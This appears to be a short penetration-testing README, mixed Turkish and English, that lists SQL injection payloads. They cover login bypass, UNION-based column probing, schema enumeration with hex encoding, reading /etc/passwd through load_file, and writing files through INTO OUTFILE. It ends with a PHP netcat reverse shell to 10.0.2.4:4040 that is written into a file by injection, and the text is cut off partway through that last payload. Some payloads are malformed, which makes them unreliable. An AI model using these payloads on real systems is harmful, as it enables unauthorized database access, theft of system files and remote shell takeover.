# SQLBypass-Penetration

## SQL Injection ve Active Directory Penetration Testing Örnekleri

### Temel SQL Injection

#### Örnek 1: Basit SQL Injection

### sql
#SELECT * FROM accounts WHERE username=david AND password='1234' AND 1=1#

### Exam 2: Login Bypass

# SELECT * FROM accounts WHERE username='david'# AND password='1234'

### Exam 3: OR Operatörü

# SELECT * FROM accounts WHERE username='david' AND password='1234' OR 1=1#

### Exam 4: SQL Injection Get Method

# http://example.com/login?username=david' OR '1'='1&password=1234

### UNION SELECT İşlemleri

#Exam 5: UNION SELECT Basic Usage

# username='david' UNION SELECT 1,2,3,4,5#

### Exam 6: Advanced Level SQL Injection

# 1' AND 1=1#
# 1' ORDER BY 1,2,3--+
# 1' GROUP BY 1,2,3--+
# ' UNION SELECT sum(columnname) from tablename--

### Get HEX

## Exam 7: HEX İle SQL Injection

# david' union select 1,table_name from information_schema.tables where table_schema = 0x64767761#

### Örnek 8: Read File

# 1' union select 1,load_file('/etc/passwd')#

### Exam 9: Write File

# 1' union select 1,'test',into outfile 'tmp/test.txt'#

### sql vulnerability Get Shell

# Exam 10: PHP Reverse Shell

# <?passthru("nc 10.0.2.4 4040 -e /bin/bash");?>

# 1' union select 1,'<?passthru("nc 10.0.2.4 4040 -e /bin/bash");?>',into outfile 'tmp/mys
